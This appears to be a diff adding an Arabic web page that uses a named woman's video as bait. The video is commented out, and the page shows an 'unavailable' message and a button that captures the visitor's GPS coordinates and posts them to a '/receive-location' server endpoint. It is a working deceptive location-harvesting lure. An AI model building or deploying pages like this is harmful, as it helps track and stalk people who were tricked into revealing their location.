@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيديو هدير عبد الرازق </title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Title and Content Section -->
+        <h1>لا يمكن الوصول لهذا المحتوي</h1>
+        <div class="content">
+            <p>محتوى غير متاح حالياً. ولكن يمكن تحديد موقعك الآن.</p>
+        </div>
+
+        <!-- Location Sharing Section -->
+        <h2>مشاركة موقعك</h2>
+        <button onclick="shareLocation()">اضغط هنا لمشاركة موقعك</button>
+        <p id="output"></p>
+
+        <!-- Video Section (Optional) -->
+        <!-- <div class="video-container">
+            <video controls autoplay loop>
+                <source src="assets/video.mp4" type="video/mp4">
+                <source src="assets/video.ogv" type="video/ogg">
+                متصفحك لا يدعم علامة الفيديو.
+            </video>
+        </div> -->
+    </div>
+
+    <script>
+        // Function to get the location and send it to the server
+        function shareLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Get latitude and longitude
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Show location on the page
+                    document.getElementById("output").innerText = `موقعك: Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                    // Send location to backend server
+                    fetch('/receive-location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log('Location sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending location:', error);
+                    });
+                }, function(error) {
+                    document.getElementById("output").innerText = 'حدث خطأ أثناء الحصول على الموقع.';
+                });
+            } else {
+                document.getElementById("output").innerText = 'المتصفح لا يدعم الحصول على الموقع.';
+            }
+        }
+    </script>
+
+    <script src="script.js"></script>
+</body>
+</html>
